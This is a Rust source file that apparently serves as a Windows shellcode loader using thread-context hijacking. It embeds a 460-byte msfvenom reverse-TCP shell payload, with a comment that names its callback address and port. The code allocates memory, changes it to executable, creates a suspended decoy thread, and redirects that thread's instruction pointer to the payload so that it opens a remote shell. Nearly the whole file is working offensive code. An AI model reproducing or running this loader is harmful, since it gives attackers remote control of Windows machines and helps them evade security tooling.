use windows_sys::{
    Win32::{
        Foundation::*,
        System::{
            Diagnostics::Debug::{GetThreadContext, SetThreadContext, CONTEXT, CONTEXT_ALL_AMD64}, Memory::*, Threading::*
        }
    }
};
use std::{ptr::{null,null_mut}};


#[repr(C, align(16))]
#[derive(Default)]
struct Aligment {
    field : CONTEXT
}


fn main() {
    unsafe {
        // Inicializate struct aligment (need for the stack) and set ContextFlags value, fill the rest with default values
        let mut context_struct = Aligment {
            field : CONTEXT {
                ContextFlags : CONTEXT_ALL_AMD64,
                ..Default::default()
            }
        };
        // msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.108 LPORT=8080 EXITFUNC=THREAD -f rust
        let buf: [u8; 460] = [0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,
        0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,
        0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,
        0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,
        0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,
        0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,
        0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,
        0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,
        0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,
        0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,
        0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,
        0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,
        0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,
        0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,
        0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,
        0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,
        0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,
        0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,
        0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,
        0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x1f,0x90,0xc0,
        0xa8,0x38,0x6c,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,
        0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,0x01,
        0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,0xd5,
        0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,
        0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,
        0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,
        0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,0xa5,0x74,0x61,0xff,
        0xd5,0x48,0x81,0xc4,0x40,0x02,0x00,0x00,0x49,0xb8,0x63,0x6d,
        0x64,0x00,0x00,0x00,0x00,0x00,0x41,0x50,0x41,0x50,0x48,0x89,
        0xe2,0x57,0x57,0x57,0x4d,0x31,0xc0,0x6a,0x0d,0x59,0x41,0x50,
        0xe2,0xfc,0x66,0xc7,0x44,0x24,0x54,0x01,0x01,0x48,0x8d,0x44,
        0x24,0x18,0xc6,0x00,0x68,0x48,0x89,0xe6,0x56,0x50,0x41,0x50,
        0x41,0x50,0x41,0x50,0x49,0xff,0xc0,0x41,0x50,0x49,0xff,0xc8,
        0x4d,0x89,0xc1,0x4c,0x89,0xc1,0x41,0xba,0x79,0xcc,0x3f,0x86,
        0xff,0xd5,0x48,0x31,0xd2,0x48,0xff,0xca,0x8b,0x0e,0x41,0xba,
        0x08,0x87,0x1d,0x60,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,
        0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,
        0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,
        0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5];

        // Memory allocation
        let p_address = VirtualAlloc(
            null(),
            buf.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );

        // copy content in the allocated memory
        std::ptr::copy_nonoverlapping(
            buf.as_ptr(),
            p_address.cast(),
            buf.len()
        );

        // change memory protection
        let mut dw_old_protection : u32 = 0;
        VirtualProtect(
            p_address,
            buf.len(),
            PAGE_EXECUTE_READ,
            &mut dw_old_protection
        );

        // Create thread for hijacking
        let h_thread = CreateThread(
            null(),
            0,
            Some(am_good),
            null(),
            CREATE_SUSPENDED,
            null_mut()
        );

        if h_thread.is_null() {
            println!("[ ! ] CreateThread Failed with Error : {}", GetLastError());
        }

        // Get context struct of the thread
        if GetThreadContext(
            h_thread,
            &mut context_struct.field
        ) == 0 {
            println!("[ ! ] GetThreadContext Failed with Error : {}", GetLastError());

        }

        // change the RIP value for our payload, and set the new value using SetThreadContext
        context_struct.field.Rip = p_address as u64;

        if SetThreadContext(
            h_thread,
            &mut context_struct.field
        ) == 0 {
            println!("[ ! ] SetThreadContext Failed with Error : {}", GetLastError());
        }

        // Resume thread and execute payload
        ResumeThread(h_thread);
        WaitForSingleObject(h_thread, INFINITE);
        CloseHandle(h_thread);
    }
}

extern "system" fn am_good(_param: *mut std::ffi::c_void) -> u32 {
    println!("banana world!");
    0
}